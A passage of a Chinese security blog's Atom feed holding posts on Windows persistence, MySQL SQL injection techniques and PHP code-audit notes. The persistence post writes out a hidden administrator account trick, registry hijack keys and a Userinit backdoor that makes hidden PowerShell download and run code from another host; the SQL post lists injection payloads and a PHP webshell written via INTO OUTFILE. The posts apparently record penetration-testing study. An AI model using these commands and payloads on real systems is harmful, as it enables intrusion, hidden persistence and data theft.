href="https://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">https://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;近一个月有点飘，心心念念的驾照说好元旦之前拿下来自己也算是做到了，想着吃顿好的庆祝下，结果把自己牙崩掉了，妈的点丧。马上考试周了，有点难受呀。抓紧着手总结下xxe要不又不知道拖到什么时候了。&lt;/p&gt;</summary>
    
    
    
    <category term="基础漏洞总结" scheme="https://phyb0x.github.io/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>win权限维持</title>
    <link href="https://phyb0x.github.io/2018/12/21/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <id>https://phyb0x.github.io/2018/12/21/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</id>
    <published>2018-12-21T04:09:57.000Z</published>
    <updated>2019-01-19T02:05:36.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前写过linux的权限，看到群里分享的权限呢维持.pdf，正好复现研究下win的权限维持。</p><span id="more"></span><h3 id="windows权限维持"><a href="#windows权限维持" class="headerlink" title="windows权限维持"></a>windows权限维持</h3><h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><p><img src="https://i.imgur.com/FZEgSbC.png"></p><p>meterperter里面执行，可以看到它改了注册表。</p><p><img src="https://i.imgur.com/2n6wPlB.png"></p><p>还可以这样 (该条命令执行成功后，会在目标系统自动创建一个 meterpreter 的 serverces ，并自动保存为开机自动启动！)</p><p><img src="https://i.imgur.com/UHx73Sy.png"></p><p>连接成功</p><p>后续再做些路由转发、抓密码的操作就不说了。</p><h4 id="影子账户"><a href="#影子账户" class="headerlink" title="影子账户"></a>影子账户</h4><p>这个也是很常见的手段了。</p><pre><code>net user admin$ Test1 /addnet loclagroup administrators admin$ /add</code></pre><p><img src="https://i.imgur.com/xM0MPBW.png"></p><p>可以看到虽然<code>net user </code>看不到用户，但是在本地组用户是能看到的。需要改注册表完全隐藏。(如果注册表sam下打不开需要先赋予权限)</p><p><img src="https://i.imgur.com/ItXbDM4.png"></p><p><img src="https://i.imgur.com/YoUDiyL.png"></p><p><img src="https://i.imgur.com/fk4Hstv.png"></p><p>我们这里要找到Names里面的admin$和admin$对应的16进制目录，右键导出到桌面。然后使用net user admin$ /del 删除admin$用户。最后双击导出的两个注册表，添加进注册表里面。</p><p><img src="https://i.imgur.com/8498ele.png"></p><p>可以看到用户组与<code>net user</code>都是看不到的，但是注册表中确实有这个用户且有管理员权限。</p><p>说白了就是先建立一个隐藏用户得到他的注册表值，然后删除这个用户，再把注册表导入。算是利用了win用户机制进行了一次欺骗。</p><h4 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h4><p>微软官方方工工具: GFlages.exe<br>下载地址:<br><a href="http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi">http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi</a></p><p>用这个工具测试了下，的确可以让程序执行结束后执行制定程序。这比打开的是程序A,而而运行行行的确是程序更隐蔽。要管理员权限。</p><p><img src="https://i.imgur.com/smcq87T.png"></p><p><img src="https://i.imgur.com/fJeN0w3.png"></p><pre><code>reg add &quot;HKLMSOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionsnotepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512reg add &quot;HKLMSOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1reg add &quot;HKLMSOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;c:windowssystem32taskmgr.exe&quot;</code></pre><p>详情请看：<a href="https://www.anquanke.com/post/id/151425">https://www.anquanke.com/post/id/151425</a></p><h4 id="userinit注册表后门"><a href="#userinit注册表后门" class="headerlink" title="userinit注册表后门"></a>userinit注册表后门</h4><pre><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code></pre><p>这个注册表键的作用是在用户进行登陆时，winlogon运行指定的程序。根据官方文档,可以更改它的值来添加与删除程序。 可以绕过某些杀软以及Windows Defender。如果使用它启动powershell，还可以传递参数，就能够留下一个无文件的后门。 </p><p><img src="https://i.imgur.com/V9e40oz.png"></p><p>注销用户重新登录后启动了notepad。</p><p>powershell 实现 (这个是真的屌！然而没有成功不知道为啥，注册表也写进去了)</p><pre><code>Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name Userinit -value &quot;C:\Windows\system32\userinit.exe,powershell.exe -w hidden -noexit -nop  -c $T=new-object net.webclient;$T.proxy=[Net.WebRequest]::GetSystemWebProxy();$T.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $T.downloadstring(&#39;http\\172.22.135.84\msf.dll&#39;);&quot; </code></pre><p><img src="https://i.imgur.com/HUbYynE.png"></p><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><pre><code>schtasks.exe /Create /TN update /TR xx(你要执行的命令)  /SC ONLOGON /F /RL HIGHEST</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>根据360-redteam分享的资料复现的，找资料的时候这老哥博客写的也很全<a href="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/">http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;之前写过linux的权限，看到群里分享的权限呢维持.pdf，正好复现研究下win的权限维持。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>sql注入小结</title>
    <link href="https://phyb0x.github.io/2018/12/11/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/"/>
    <id>https://phyb0x.github.io/2018/12/11/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/</id>
    <published>2018-12-11T04:24:08.000Z</published>
    <updated>2019-01-19T02:05:22.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>基础漏洞学好研究明白才能更好的去学习审计。今天加了P神的圈子，代码审计和日战比当然是枯燥了些，希望自己能坚持下去。基础漏洞准备写个系<br>列，稍微深入研究下。</p><span id="more"></span><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>总结了下觉得mysql注入主要分为如下几种方式。</p><h3 id="基础注入"><a href="#基础注入" class="headerlink" title="基础注入"></a>基础注入</h3><p>最简单的注入方式，一般是查询语句中没有对参数做过滤限制，导致绕过执行我们自己的查询语句并把直接显示到页面。</p><p>看网上一些文章去分析整型、字符型，当然这都无所谓。我们要思考的就是怎样执行我们的查询语句？</p><p>sqlmap中有这样一个参数。</p><pre><code>prefix=PREFIX 注入payload字符串前缀   --prefix=admin%1$&#39;</code></pre><p>这参数的作用是绕过查询参数的闭合符号。</p><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;</code></pre><p>以这条语句Less-1为例</p><p><img src="https://i.imgur.com/kR3FI3x.png"></p><p>可以看到没有报错并且执行了我们后插入的语句</p><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;-1&#39; union select 1,username,password from users where id=2 %23 # LIMIT 0,1&quot;</code></pre><p>也就是说遇到这种注入我们要做的就是无论参数被什么符号闭合，找到它fuzz出它闭合它。</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>这个类型的注入我们这有根据页面的变化来逐字猜解我们要的信息。猜解正确回显正常，反之错误。</p><p>主要用到如下几种判断函数</p><h5 id="left"><a href="#left" class="headerlink" title="left"></a>left</h5><pre><code>left(a,b)从左侧截取a的前b位</code></pre><h5 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h5><pre><code>substr(a,b,c)从b位置开始，截取字符串a的c长度。结合ascii()使用</code></pre><h5 id="MID-ORD"><a href="#MID-ORD" class="headerlink" title="MID/ORD"></a>MID/ORD</h5><pre><code>mid(a,b,c)同substrOPD()同ascii()</code></pre><h5 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h5><pre><code>select user() regexp &#39;^[a-z]&#39;;</code></pre><p><img src="https://i.imgur.com/lTBfYEN.png"></p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>根据页面返回时间长短判断猜解是否正确。结合<code>if(condition,true,flase) / and 1=*</code>判断语句使用。</p><p>主要用到如下几种函数</p><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h5><pre><code>sleep(N)  可以让语句运行N秒</code></pre><h5 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h5><pre><code>benchmark() 可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。 mysql&gt; select benchmark(10000000,MD5(&quot;hello word&quot;));+---------------------------------------+| benchmark(10000000,SHA1(&quot;hello word&quot;)) |+---------------------------------------+| 0 |+---------------------------------------+1 row in set (4.93 sec)</code></pre><h5 id="get-lock"><a href="#get-lock" class="headerlink" title="get_lock"></a>get_lock</h5><pre><code>get_lock(key,timeout) 一个是key，就是根据这个参数进行加锁的，另一个是等待时间(s)。如果key是第一次加锁返回1，反之等待时间进行第二次加锁。利用条件比较苛刻，需要使用 mysql_pconnect函数来连接数据库</code></pre><p>要两个session分别进行</p><p><img src="https://i.imgur.com/LYb3iii.png"></p><h5 id="RLIKE"><a href="#RLIKE" class="headerlink" title="RLIKE"></a>RLIKE</h5><p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p><pre><code>rpad(str1,length,str2) str1没有length长用str2填充repeat(str,count) 返回str重复count次之后的str  mysql&gt; select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);+-------------------------------------------------------------+| rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) |+-------------------------------------------------------------+|   0 |+-------------------------------------------------------------+1 row in set (5.27 sec)</code></pre><h5 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h5><p>概念自行百度吧，我现代60飘过。</p><p>本地测试两个表还可以，三个直接爆炸。(等不出来了估计是小时级的)</p><p><img src="https://i.imgur.com/eQTUCBT.png"></p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错注入也是一种盲注，利用MYSQL函数特性返回信息，法师的代码审计后面有写到一共十个函数。</p><h5 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h5><pre><code>floor() 去除小数部分rand() 产生随机数，如果限定种子rand(x)则随机数是固定的 </code></pre><p>利用group by 和floor抛出主键冗余报错返回我们想要的信息。</p><pre><code>select count(*),concat(floor(rand(0)*2),(payload)) as x from information_schema.tables group by x;</code></pre><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><pre><code>extractvalue(xml文档，xml路径) 对xml文档进行查询 查询的字符串最大长度32位，超出要结合substr</code></pre><p>这个函数只要语法不错就不会报错会返回空。xml路径是/xx/x/ 这样的形式，我们只要写入非法格式就会报错。</p><pre><code>select username from security.user where id=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(payload))))</code></pre><h5 id="updatexml-同32位"><a href="#updatexml-同32位" class="headerlink" title="updatexml(同32位)"></a>updatexml(同32位)</h5><pre><code>updatexml(目标xml文档,xml路径,更新的内容) 更新xml文档的函数  原理用法同上给错误路径格式报错</code></pre><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><pre><code>exp()当传入的数值大于709时就会引起溢出错误(适用大于MySQL5.5.5)select exp(~(select*from(payload)x))</code></pre><h5 id="NAME-CONST"><a href="#NAME-CONST" class="headerlink" title="NAME_CONST"></a>NAME_CONST</h5><pre><code> and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)</code></pre><p>利用mysql列明重复会报错，适用低版本(貌似只能测试内置函数,我尝试写入payload报错网上也没有找到相应的实例)</p><h5 id="join"><a href="#join" class="headerlink" title="join"></a>join</h5><p>在已知表明的情况下适用</p><pre><code>select * from (select * from 表名 a join 表名 b) c)  在得到一个字段后，使用using得到下一个字段select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c  </code></pre><h5 id="几何函数"><a href="#几何函数" class="headerlink" title="几何函数"></a>几何函数</h5><pre><code>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</code></pre><p>这些用法类似归结到一类，适用大于Mysql5.5.47，不包括5.7.17</p><pre><code>select linestring((select * from(select * from(payload)a)b));</code></pre><h3 id="文件操作及增删改"><a href="#文件操作及增删改" class="headerlink" title="文件操作及增删改"></a>文件操作及增删改</h3><h4 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h4><p>使用条件</p><pre><code>1、有读写权限  and(select count(*) from mysql.user)&gt;0/* 返回正常说明有读写权限2、知道绝对路径3、读取文件在服务器上4、读取文件要小于 max_allowed_packet</code></pre><p>示例</p><pre><code>1、select 1,2,3,hex(replace(load_file(char(ascii编码的payload))))2、select 1,2,3,load_file(char(ascii编码的payload))3、select 1,2,3,load_file(hexpayload)4、select 1,2,3,load_file(c:\\boot.ini)</code></pre><h4 id="load-data-infile"><a href="#load-data-infile" class="headerlink" title="load data infile"></a>load data infile</h4><p>将文本中的数据写入到表中。</p><h4 id="outfile-文件导出"><a href="#outfile-文件导出" class="headerlink" title="outfile 文件导出"></a>outfile 文件导出</h4><pre><code>Select &lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php” </code></pre><p>sql写马用的及时这种方式，要有读写权限。也可以结合load_file()使用。<br>    select load_ file(‘c:\wamp\bin\mysql\mysql5.6.17\my.ini’)into outfile‘c:\wamp\www\test.php</p><h3 id="常见注入"><a href="#常见注入" class="headerlink" title="常见注入"></a>常见注入</h3><h4 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h4><p>mysql使用GBK编码时认定两个字为一个汉字，在一些安全函数是这样(&#39;)转义单引号，我们可以%df%5c%27这样转义过来就变成<code>運&#39;</code>单引号逃逸。<br>再说一下这个一定要</p><pre><code>mysql_real_escape_stringmysql_set_charset </code></pre><p>一起使用，要不然还是会造成注入。</p><h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p><code>order by</code>排序函数，经常被使用在猜解列名。order by注入不是利用这个函数去注入而是指注入点在order by后面。</p><pre><code>$sql = &quot;select * from users order by $sort&quot;</code></pre><p>利用方式：</p><p>1、参数后直接跟注入语句 ?sort=(payload)</p><p><img src="https://i.imgur.com/Yo5m548.png"></p><p>2、?sort=1 and (payload)</p><p><img src="https://i.imgur.com/o5oPYIY.png"></p><p>3、利用布尔类型进行判断 不限于rand(true/false) 也可以利用if()等判断函数。</p><pre><code>/?sort=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00))</code></pre><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>limit注入其实和order by 分不开。看p牛博客<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p><pre><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT injection_point</code></pre><p>limit后面可以跟两个函数<code>PROCEDURE 和 INTO</code>，INTO要有写入权限，可以用报错和时间盲注直接上payload</p><p>报错注入</p><pre><code>SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </code></pre><p>时间盲注(sleep不行)</p><pre><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></pre><h4 id="无逗号注入"><a href="#无逗号注入" class="headerlink" title="无逗号注入"></a>无逗号注入</h4><p>忘了是在哪到ctf题目里面get到的，以为不重要，但是某位老哥面试的时候被问到了。还是记录下，直接上payload。</p><pre><code>&#39; union select * from (payload) a join (select version() ) b %23</code></pre><h4 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h4><p>将select查询到的数据与一个域名拼接成一个新的子域名，然后请求解析这个子域名，利用dns解析产生的记录日志来查看数据。</p><h5 id="Ceye"><a href="#Ceye" class="headerlink" title="Ceye"></a>Ceye</h5><p>CEYE<a href="http://ceye.io/">http://ceye.io</a>是一个检测带外流量的监控平台，如DNS查询和HTTP请求。注册之后会分配一个二级域名<code>：xxx.ceye.io</code>，我们把注入信息放到三级域名。</p><p>因为要用load_file()解析DNS请求，所以mysql <code>secure_file_priv</code>的值不能为NULL。这个配置在phpmyadmin日志文件getshell里也有用到。</p><p><img src="https://i.imgur.com/TsAXIGM.png"></p><p><img src="https://i.imgur.com/tKP7Ktj.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>sql基础基本就这样了，主要是要灵活利用。总结了一些报错盲注函数，遇到waf的时候可以都试试，后续尝试写一些bypass的，可能是只研究sqlbypass，也可能等基础漏洞写完之后一起研究下。(估计很有难度)</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.freebuf.com/articles/web/175049.html">https://www.freebuf.com/articles/web/175049.html</a></p><p><a href="https://www.cdxy.me/?p=789">https://www.cdxy.me/?p=789</a></p><p><a href="https://xz.aliyun.com/t/253">https://xz.aliyun.com/t/253</a></p><p><a href="https://www.cnblogs.com/afanti/p/8047530.html">https://www.cnblogs.com/afanti/p/8047530.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;基础漏洞学好研究明白才能更好的去学习审计。今天加了P神的圈子，代码审计和日战比当然是枯燥了些，希望自己能坚持下去。基础漏洞准备写个系&lt;br&gt;列，稍微深入研究下。&lt;/p&gt;</summary>
    
    
    
    <category term="基础漏洞总结" scheme="https://phyb0x.github.io/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>php审计笔记</title>
    <link href="https://phyb0x.github.io/2018/12/06/php%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
    <id>https://phyb0x.github.io/2018/12/06/php%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/</id>
    <published>2018-12-06T14:11:54.000Z</published>
    <updated>2019-01-19T02:04:54.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>虽然自己之前有整理过代码审计的入门笔记，但还是比较幼稚，自己下手分析了几个cms才逐渐悟出点道道，说白了还是从危险函数入手，分析各个漏洞原理根据危险函数溯源，结合灰盒进行审计。</p><span id="more"></span><h2 id="危险函数集锦与漏洞挖掘"><a href="#危险函数集锦与漏洞挖掘" class="headerlink" title="危险函数集锦与漏洞挖掘"></a>危险函数集锦与漏洞挖掘</h2><h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><h4 id="register-globals"><a href="#register-globals" class="headerlink" title="register_globals"></a>register_globals</h4><p>直接把用户GET/POST提交的变量注册成全局变量。 php&lt;5.4.0</p><h4 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h4><p>远程文件包含，提交参数直接执行php。</p><pre><code>include $_GET[&#39;a&#39;]</code></pre><h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h4><p>魔术引号自动过滤 GET/POST/COOKIE 但是不会处理$_SERVER(client-ip/referer注入)  php&lt;5.4</p><h4 id="magic-quotes-runtime"><a href="#magic-quotes-runtime" class="headerlink" title="magic_quotes_runtime"></a>magic_quotes_runtime</h4><p>作用同上，受体数据库或者文件中获取的数据 php&lt;5.4</p><h4 id="safe-mode"><a href="#safe-mode" class="headerlink" title="safe_mode"></a>safe_mode</h4><p>安全模式，开启是会对危险函数进行限制，可以使用<code>safe_mode_exec_dir</code>指向可以操作危险函数的目录</p><h4 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h4><p>限制php可以访问的目录</p><h4 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h4><p>禁用函数，通过他禁用危险函数。<code>dl()</code>也要禁用，它可以加载PHP扩展绕过限制(安全模式下禁用)</p><h4 id="display-errors-error-reporting"><a href="#display-errors-error-reporting" class="headerlink" title="display_errors error_reporting"></a>display_errors error_reporting</h4><p>错误回显</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>老生常谈的了，不去讲原理直接说一下关键字。</p><pre><code>select from、mysql_connect、mysql_query、mysql_fetch_now、update、insert、delete</code></pre><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><pre><code>set character_set_client=gbkset names &#39;gbk&#39;mysql_set_charset(&#39;gbk&#39;)</code></pre><p>一般情况下 <code>set names &#39;gbk&#39;</code>还是存在漏洞，官方推荐    <code>mysql_set_charset</code>也是调用<code>set names &#39;gbk&#39;</code> ，还是要配合</p><pre><code>mysql_real_escape_string</code></pre><p>修复建议使用PDO或者在查询之前先执行<code>set names &#39;gbk&#39;,character_set_client=binary</code></p><h5 id="二次urldecode注入"><a href="#二次urldecode注入" class="headerlink" title="二次urldecode注入"></a>二次urldecode注入</h5><p>提交参数到WebServer时会自动进行URL解码，<code>id=%2527</code>里面没有单引号所以可以绕过GPC，这时使用</p><pre><code>urldecoderawurldecode</code></pre><p>解码参数会造成单引号绕过引发注入。</p><h5 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><pre><code>addslashesmysql_escape_stringintvalPDO</code></pre><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>找没有被过滤的参数直接输出触发漏洞。</p><p>直接找一些输出函数</p><pre><code>print、print_r、echo、printf、sprintf、die、var_dump、var_export</code></pre><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>越权在没有token限制下诱导高权限用户点击业务操作。黑盒测试在非静态页面看有没有token，去掉referer访问看返回值。</p><pre><code>tokenreferer</code></pre><h4 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h4><h5 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h5><pre><code>include()、include_once()//遇到错误继续执行require()、require_once()//遇到错误退出程序</code></pre><p>包含日志图片等。</p><h5 id="文件包含截断"><a href="#文件包含截断" class="headerlink" title="文件包含截断"></a>文件包含截断</h5><pre><code>%00截断   php&lt;5.3  受限GPC/addslashes./截断 Windows 240(./) Linux 2038 (./) 不受限GPC PHP&lt;5.3?伪截断  把？后的内容当做参数  不受版本与GPC限制</code></pre><h5 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h5><pre><code>file_get_contents()、highlight_file()、fopen()、readfile()、fread()、fgetss()、fgets()、parse_ini_file()、show_source()、file()</code></pre><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><pre><code>move_uploaded_file()</code></pre><p>上传函数只有这一个，别名绕过黑名单、GIF89a、文件类型、截断上传….</p><h5 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h5><p>文件名字可以用../跳转</p><pre><code>unlink()session_destroy()</code></pre><p>黑盒去找功能点，找文件名参数传递过程看是否可控</p><h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><p>可以把代码注入到应用中去执行。</p><pre><code>eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()、array_map()等</code></pre><p>还有动态函数的代码执行</p><pre><code>$_GET($POST[&quot;xx&quot;])</code></pre><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>直接执行系统命令。</p><pre><code>system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()一共七个函数，反引号也可以(`)</code></pre><h4 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h4><p>我们自定义的参数值替换程序原有的变量值。</p><pre><code>extract()、parse_str()/import_request_variables()使用这个函数相当于开启注册了全局变量(5-5.4)。$$</code></pre><h4 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h4><p>重装，修改密码，越权，验证，cookie等。</p><h5 id="判断绕过"><a href="#判断绕过" class="headerlink" title="判断绕过"></a>判断绕过</h5><pre><code>in_array() 判断在不在数组内，比较之前自动进行类型转换is_numeric() 传入hex判断为true，mysql可以使用hex代替字符串，易引发注入xss== 双等于判断之前先做类型抓换</code></pre><h5 id="未die-、exit-、return"><a href="#未die-、exit-、return" class="headerlink" title="未die()、exit()、return()"></a>未die()、exit()、return()</h5><h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4><h5 id="GPC"><a href="#GPC" class="headerlink" title="GPC"></a>GPC</h5><p><code>$_SERVER</code>函数获取的header字段不受GPC影响。</p><h5 id="编码转换-宽字节注入"><a href="#编码转换-宽字节注入" class="headerlink" title="编码转换(宽字节注入)"></a>编码转换(宽字节注入)</h5><h5 id="字符截断"><a href="#字符截断" class="headerlink" title="字符截断"></a>字符截断</h5><pre><code>%00iconv() 转码时char(128-255)截断</code></pre><h5 id="php-输入输出流"><a href="#php-输入输出流" class="headerlink" title="php://输入输出流"></a>php://输入输出流</h5><pre><code>php://stdinphp://stdoutphp://stderrphp://inputphp://outputphp://fdphp://memoryphp://tempphp://filter</code></pre><h5 id="正则表达没有使用限定符"><a href="#正则表达没有使用限定符" class="headerlink" title="正则表达没有使用限定符(^ $)"></a>正则表达没有使用限定符(^ $)</h5>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;虽然自己之前有整理过代码审计的入门笔记，但还是比较幼稚，自己下手分析了几个cms才逐渐悟出点道道，说白了还是从危险函数入手，分析各个漏洞原理根据危险函数溯源，结合灰盒进行审计。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="https://phyb0x.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>powershell运用</title>
    <link href="https://phyb0x.github.io/2018/12/01/powershell%E8%BF%90%E7%94%A8/"/>
    <id>https://phyb0x.github.io/2018/12/01/powershell%E8%BF%90%E7%94%A8/</id>
    <published>2018-12-01T14:31:41.000Z</published>
    <updated>2019-01-19T02:04:58.000Z</updated>
    
